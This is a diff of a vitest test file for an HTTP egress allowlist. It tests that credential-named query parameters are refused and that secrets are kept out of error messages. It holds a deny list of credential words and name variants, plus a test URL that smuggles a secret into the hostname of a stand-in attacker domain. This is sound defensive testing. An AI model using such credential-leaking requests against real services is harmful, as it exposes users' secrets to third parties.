@@ -1,5 +1,8 @@
 import { HttpResponse, http } from 'msw/http';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
+import { ALLOWED_TOKEN_PARAMS, CREDENTIAL_WORDS, isCredentialParam } from '../../src/http/egress.js';
+import { SEARCHAPI_PARAMS } from '../../src/searchapi/params.js';
+import { TRAVELPAYOUTS_PARAMS } from '../../src/travelpayouts/params.js';
 import { makeKit, req, SEARCH, SENTINELS, TP, testLimits } from '../fakes.js';
 import { asProviderError } from '../support/guards.js';
 import { server } from '../support/msw.js';
@@ -39,39 +42,54 @@ describe('egress allowlist (spec §5.3 "Egress")', () => {
   it('refuses a credential in the query, keeping it out of the message', async () => {
     expect((await refused({ url: `${SEARCH}?api_key=${key}` })).message).not.toContain(key);
   });
-  // why: CodeRabbit batch 3 — the value check knows only configured secrets, so an unconfigured key in a credential
-  // parameter (?api_key=…) passed, reached fetch and could be recorded; credential names are refused by name
+  // why: CodeRabbit batch 3 and PR #3 review — the value check knows only configured secrets, so an unconfigured key
+  // in a credential parameter (?api_key=…) passed, reached fetch and could be recorded. A name is refused when any
+  // of its words (split on _, - and camelCase) is a credential word; SearchApi's two itinerary tokens are the only
+  // exceptions. Every case is derived from the exported lists, so a removed entry fails a test.
+  const refusedName = async (name: string) => {
+    const err = await refused({ url: `${SEARCH}?engine=google_flights&${name}=not-a-configured-secret-9f` });
+    expect(err.message).toContain(`credential query parameter ${name.toLowerCase()}`);
+    expect(err.message).not.toContain('not-a-configured-secret-9f');
+  };
+  it.each([...CREDENTIAL_WORDS])('refuses the credential word %s as a whole name', refusedName);
+  it.each([...CREDENTIAL_WORDS].map((w) => `x_${w}`))('refuses %s (the word as a suffix)', refusedName);
+  it.each([...CREDENTIAL_WORDS].map((w) => `${w}_base`))('refuses %s (the word as a prefix)', refusedName);
   it.each([
-    'api_key',
     'API_KEY',
-    'apikey',
     'api-key',
-    'key',
-    'token',
-    'access_token',
-    'auth',
-    'auth_token',
-    'password',
-    'secret',
+    'apiKey',
+    'accessToken',
+    'X-Access-Token',
+    'x-auth-token',
+    'secret_key_base',
+    'session_token',
+    'private_key',
     'client_secret',
-    'x-access-token',
-  ])(
-    'refuses the credential query parameter %s whatever its value, naming the parameter only',
-    async (name) => {
-      const err = await refused({
-        url: `${SEARCH}?engine=google_flights&${name}=not-a-configured-secret-9f`,
-      });
-      expect(err.message).toContain(`credential query parameter ${name.toLowerCase()}`);
-      expect(err.message).not.toContain('not-a-configured-secret-9f');
-    },
-  );
+  ])('refuses %s (case, hyphen and camelCase forms)', refusedName);
   it('allows the itinerary-token parameters SearchApi steps 2 and 3 send', async () => {
     const { kit } = makeKit();
     server.use(http.get(SEARCH, () => HttpResponse.json({ ok: true })));
-    for (const name of ['departure_token', 'booking_token'])
+    for (const name of ALLOWED_TOKEN_PARAMS)
       expect(
         (await drive(kit.request(req({ url: `${SEARCH}?engine=google_flights&${name}=WyJDalJJ` })))).body,
       ).toEqual({ ok: true });
+  });
+  it.each(['departure_token_x', 'x_departure_token', 'departureToken2'])(
+    'refuses %s: only the exact itinerary-token names are allowed',
+    refusedName,
+  );
+  it('an allowed itinerary token beside a credential name is still refused', async () => {
+    const err = await refused({
+      url: `${SEARCH}?engine=google_flights&departure_token=WyJD&access_token=abc123`,
+    });
+    expect(err.message).toContain('credential query parameter access_token');
+  });
+  it('every parameter name the adapters send passes the name check', () => {
+    const names = [SEARCHAPI_PARAMS, TRAVELPAYOUTS_PARAMS].flatMap((a) =>
+      Object.values(a.endpoints).flatMap((e) => e.names),
+    );
+    expect(names.length).toBeGreaterThan(10);
+    expect(names.filter((n) => isCredentialParam(n))).toEqual([]);
   });
   it('refuses a credential smuggled into a hostname without echoing it (sec-005)', async () => {
     expect((await refused({ url: `https://${key}.evil.example/api/v1/search` })).message).not.toContain(key);
